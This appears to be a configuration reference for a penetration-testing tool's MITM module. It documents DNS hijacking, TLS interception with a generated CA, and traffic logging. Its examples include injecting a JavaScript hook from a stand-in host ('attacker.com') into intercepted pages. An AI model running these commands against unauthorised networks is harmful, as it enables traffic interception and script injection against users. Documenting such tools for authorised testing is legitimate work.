# Configuration Reference

> Complete reference for all MITM command options and settings.

## Command Overview

```
rb mitm intercept <verb> [FLAGS]
```

### Available Verbs

| Verb | Description |
|------|-------------|
| `start` | Start full MITM stack (DNS + TLS proxy) |
| `proxy` | Start TLS interception proxy only |
| `dns` | Start DNS hijacking server only |
| `shell` | Interactive TUI shell |
| `generate-ca` | Generate CA certificate |
| `export-ca` | Export CA for installation |

---

## start - Full MITM Stack

Start combined DNS hijacking and TLS interception.

```bash
rb mitm intercept start [FLAGS]
```

### Required Flags

| Flag | Type | Description |
|------|------|-------------|
| `--target`, `-t` | String | Domain pattern to hijack (e.g., `*.target.com`) |
| `--proxy-ip`, `-i` | IP | IP to redirect hijacked traffic to |

### Optional Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--hijack-ip` | IP | - | Alias for `--proxy-ip` |
| `--dns-bind` | Address | `0.0.0.0:53` | DNS server bind address |
| `--upstream`, `-u` | IP | `8.8.8.8` | Primary upstream DNS |
| `--upstream-fallback` | IP | `1.1.1.1` | Fallback upstream DNS |
| `--proxy-port`, `-p` | Port | `8080` | MITM proxy listen port |
| `--proxy-bind` | Address | `0.0.0.0` | MITM proxy bind address |
| `--ca-cert`, `-c` | Path | auto-gen | CA certificate PEM file |
| `--ca-key`, `-k` | Path | auto-gen | CA private key PEM file |
| `--log`, `-l` | Flag | disabled | Enable stdout logging |
| `--log-file` | Path | - | Log traffic to file |
| `--log-format` | String | `text` | Log format: `text` or `json` |
| `--hook`, `-H` | URL | - | JS hook URL for injection |
| `--verbose`, `-v` | Flag | disabled | Verbose output |

### Examples

```bash
# Minimal
rb mitm intercept start --target "*.target.com" --proxy-ip 10.0.0.5

# Full configuration
rb mitm intercept start \
  --target "*.corp.example.com" \
  --proxy-ip 192.168.1.100 \
  --dns-bind 0.0.0.0:53 \
  --upstream 8.8.8.8 \
  --upstream-fallback 1.1.1.1 \
  --proxy-port 8443 \
  --proxy-bind 0.0.0.0 \
  --ca-cert ./certs/ca.pem \
  --ca-key ./certs/ca-key.pem \
  --log \
  --log-file traffic.json \
  --log-format json \
  --hook "http://attacker.com:3000/hook.js"
```

---

## proxy - TLS Interception Proxy

Start TLS interception proxy only (no DNS hijacking).

```bash
rb mitm intercept proxy [FLAGS]
```

### Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--proxy-port`, `-p` | Port | `8080` | Listen port |
| `--proxy-bind` | Address | `127.0.0.1` | Bind address |
| `--ca-cert`, `-c` | Path | auto-gen | CA certificate PEM |
| `--ca-key`, `-k` | Path | auto-gen | CA private key PEM |
| `--log`, `-l` | Flag | disabled | Enable stdout logging |
| `--log-file` | Path | - | Log traffic to file |
| `--log-format` | String | `text` | Log format |
| `--hook`, `-H` | URL | - | JS hook URL |
| `--verbose`, `-v` | Flag | disabled | Verbose output |

### Examples

```bash
# Local testing
rb mitm intercept proxy --proxy-port 8080

# Network proxy
rb mitm intercept proxy \
  --proxy-bind 0.0.0.0 \
  --proxy-port 8080 \
  --log \
  --log-file traffic.log

# With RBB hook
rb mitm intercept proxy \
  --proxy-port 8080 \
  --hook "http://192.168.1.100:3000/hook.js"
```

---

## dns - DNS Hijacking Server

Start DNS hijacking server only (no TLS proxy).

```bash
rb mitm intercept dns [FLAGS]
```

### Required Flags

| Flag | Type | Description |
|------|------|-------------|
| `--target`, `-t` | String | Domain pattern to hijack |
| `--hijack-ip` | IP | IP to return for hijacked queries |

### Optional Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--proxy-ip` | IP | - | Alias for `--hijack-ip` |
| `--dns-bind` | Address | `0.0.0.0:53` | Bind address |
| `--upstream`, `-u` | IP | `8.8.8.8` | Primary upstream DNS |
| `--upstream-fallback` | IP | `1.1.1.1` | Fallback upstream DNS |
| `--verbose`, `-v` | Flag | disabled | Verbose output |

### Examples

```bash
# Basic hijacking
rb mitm intercept dns \
  --target "*.target.com" \
  --hijack-ip 10.0.0.5

# Non-standard port
rb mitm intercept dns \
  --target "*.target.com" \
  --hijack-ip 10.0.0.5 \
  --dns-bind 0.0.0.0:5353

# Custom upstream
rb mitm intercept dns \
  --target "*.target.com" \
  --hijack-ip 10.0.0.5 \
  --upstream 1.1.1.1 \
  --upstream-fallback 9.9.9.9
```

---

## shell - Interactive TUI

Start interactive TUI shell with MITM proxy.

```bash
rb mitm intercept shell [FLAGS]
```

### Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--proxy-port`, `-p` | Port | `8080` | Listen port |
| `--proxy-bind` | Address | `127.0.0.1` | Bind address |
| `--ca-cert`, `-c` | Path | auto-gen | CA certificate PEM |
| `--ca-key`, `-k` | Path | auto-gen | CA private key PEM |

### Examples

```bash
# Local testing
rb mitm intercept shell --proxy-port 8080

# Network access
rb mitm intercept shell \
  --proxy-bind 0.0.0.0 \
  --proxy-port 8080

# With custom CA
rb mitm intercept shell \
  --proxy-port 8080 \
  --ca-cert ./certs/ca.pem \
  --ca-key ./certs/ca-key.pem
```

### Shell Commands

| Command | Alias | Description |
|---------|-------|-------------|
| `filter <expr>` | `f` | Set request filter |
| `filter clear` | | Clear filter |
| `clear` | `c` | Clear request history |
| `autoscroll on/off` | `scroll` | Toggle auto-scroll |
| `intercept on/off` | `i` | Toggle intercept mode |
| `quit` | `q` | Exit shell |

### Shell Keyboard Shortcuts

| Key | Action |
|-----|--------|
| `↑`/`k` | Move up |
| `↓`/`j` | Move down |
| `Enter` | Toggle details |
| `Tab` | Next detail tab |
| `/` | Search mode |
| `:` | Command mode |
| `?` | Help |
| `q` | Quit |

---

## generate-ca - Generate CA Certificate

Generate a new CA certificate for MITM interception.

```bash
rb mitm intercept generate-ca [FLAGS]
```

### Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--output`, `-o` | Path | `.` | Output directory |

### Output Files

| File | Description |
|------|-------------|
| `mitm-ca.pem` | CA certificate (PEM format) |
| `mitm-ca-key.pem` | CA private key (PEM format) |

### Examples

```bash
# Current directory
rb mitm intercept generate-ca

# Specific directory
rb mitm intercept generate-ca --output ./certs

# Created files:
# ./certs/mitm-ca.pem
# ./certs/mitm-ca-key.pem
```

---

## export-ca - Export CA Certificate

Export CA certificate for installation on targets.

```bash
rb mitm intercept export-ca [FLAGS]
```

### Required Flags

| Flag | Type | Description |
|------|------|-------------|
| `--ca-cert`, `-c` | Path | Path to CA certificate PEM |

### Optional Flags

| Flag | Type | Default | Description |
|------|------|---------|-------------|
| `--format`, `-f` | String | `pem` | Export format: `pem` or `der` |
| `--output`, `-o` | Path | auto | Output file path |

### Examples

```bash
# Export as PEM
rb mitm intercept export-ca --ca-cert ./certs/mitm-ca.pem

# Export as DER for Windows
rb mitm intercept export-ca \
  --ca-cert ./certs/mitm-ca.pem \
  --format der \
  --output ./mitm-ca.der
```

---

## Log Formats

### Text Format

```
[MITM] [hostname] METHOD /path HTTP/1.1
[MITM] [hostname] <- STATUS STATUS_TEXT
```

Example:
```
[MITM] [api.example.com] GET /v1/users HTTP/1.1
[MITM] [api.example.com] <- 200 OK
[MITM] [api.example.com] POST /v1/login HTTP/1.1
[MITM] [api.example.com] <- 302 Found
```

### JSON Format

```json
{"ts":1702147200,"type":"request","host":"api.example.com","method":"GET","path":"/v1/users","version":"HTTP/1.1"}
{"ts":1702147200,"type":"response","host":"api.example.com","status":200,"status_text":"OK"}
```

### Log Types

| Type | Fields |
|------|--------|
| `request` | `ts`, `host`, `method`, `path`, `version` |
| `response` | `ts`, `host`, `status`, `status_text` |
| `info` | `ts`, `message` |
| `websocket` | `ts`, `host`, `direction`, `frame`, `frame_type`, `size` |

---

## Filter Syntax

Used in shell command mode (`:filter`).

### Filter Keys

| Key | Aliases | Description | Example |
|-----|---------|-------------|---------|
| `host` | `h` | Hostname pattern (glob) | `host:*.api.com` |
| `method` | `m` | HTTP method | `method:POST` |
| `path` | `p` | Path pattern (glob) | `path:/api/*` |
| `status` | `s` | Status code or range | `status:200`, `status:4xx` |
| `type` | `t`, `content-type` | Content-type contains | `type:json` |

### Glob Patterns

| Pattern | Meaning |
|---------|---------|
| `*` | Any characters |
| `?` | Single character |

### Examples

```bash
# Single filter
:filter host:*.api.com

# Multiple filters
:filter host:api.* method:POST status:2xx

# Path pattern
:filter path:/api/v1/*

# Content type
:filter type:json

# Error responses
:filter status:4xx

# Clear filter
:filter clear
```

---

## Environment Variables

Currently, the MITM module doesn't use environment variables. All configuration is done via command-line flags.

---

## Default Values

| Setting | Default |
|---------|---------|
| DNS bind address | `0.0.0.0:53` |
| Proxy bind address | `127.0.0.1:8080` |
| Primary upstream DNS | `8.8.8.8` |
| Fallback upstream DNS | `1.1.1.1` |
| Connection timeout | 30 seconds |
| CA validity | 10 years (3650 days) |
| Server cert validity | 1 year (365 days) |
| Key algorithm | ECDSA P-256 |
| Log format | `text` |

---

## Troubleshooting

### Permission Denied on Port 53

DNS requires privileged port access:

```bash
# Option 1: Run as root
sudo rb mitm intercept dns ...

# Option 2: Capabilities (Linux)
sudo setcap cap_net_bind_service=+ep /path/to/rb

# Option 3: Use non-standard port
rb mitm intercept dns --dns-bind 0.0.0.0:5353 ...
```

### Certificate Warnings

Target doesn't trust CA:

1. Verify CA is installed in correct store
2. Restart browser after installation
3. Check certificate fingerprint matches
4. For Firefox: Install in Firefox-specific store

### Connection Refused

Proxy not accepting connections:

```bash
# Check proxy is running
netstat -tlnp | grep 8080

# Check bind address
# Use 0.0.0.0 for network access, 127.0.0.1 for local only
rb mitm intercept proxy --proxy-bind 0.0.0.0 --proxy-port 8080
```

### DNS Not Hijacking

Queries not reaching your DNS:

1. Verify target is using your DNS server
2. Check pattern matches domain
3. Ensure UDP port 53 is accessible
4. Check firewall rules

```bash
# Test DNS directly
dig @your-ip target.com

# Verify hijacking
dig @your-ip api.target.com
# Should return your proxy IP
```

### TLS Handshake Failures

TLS negotiation fails:

1. Check target supports TLS versions
2. Verify CA certificate is valid
3. Some sites use certificate pinning
4. Check for HSTS preload issues

```bash
# Enable verbose for debugging
rb mitm intercept proxy --verbose ...
```

### Shell Not Rendering

TUI display issues:

1. Ensure terminal supports ANSI colors
2. Check terminal size (minimum 80x24)
3. Try different terminal emulator
4. Verify raw mode is working

### Injection Not Working

Hook script not injected:

1. Verify response is HTML (`Content-Type: text/html`)
2. Check response has `</body>` tag
3. Ensure compression is stripped
4. Verify hook URL is accessible

```bash
# Test with logging
rb mitm intercept proxy --hook "..." --log
# Look for "Injected hook" messages
```

---

## Security Best Practices

### CA Key Protection

```bash
# Restrict permissions
chmod 600 mitm-ca-key.pem

# Secure storage
# Use encrypted disk or HSM

# Never commit to version control
echo "*.pem" >> .gitignore
```

### Network Isolation

```bash
# Use non-standard ports during testing
rb mitm intercept proxy --proxy-port 8443

# Bind to specific interface
rb mitm intercept proxy --proxy-bind 192.168.1.100

# Use firewall rules
iptables -A INPUT -p tcp --dport 8080 -s 192.168.1.0/24 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j DROP
```

### Log Handling

```bash
# Secure log files
chmod 600 traffic.log

# Encrypt sensitive logs
gpg -c traffic.json

# Secure deletion after engagement
shred -vfz -n 5 traffic.log
```

### Post-Engagement Cleanup

```bash
# Remove CA from targets
# Stop all MITM processes
# Secure delete CA key
shred -vfz -n 5 mitm-ca-key.pem

# Archive engagement data per policy
# Document findings
```

---

## Related Documentation

- [Overview](00-overview.md) - Introduction to MITM domain
- [DNS Hijacking](01-dns-hijacking.md) - DNS server details
- [TLS Interception](02-tls-interception.md) - Proxy details
- [Interactive Shell](03-shell.md) - TUI interface
- [Certificates](04-certificates.md) - CA management
- [Attack Scenarios](05-scenarios.md) - Real-world examples
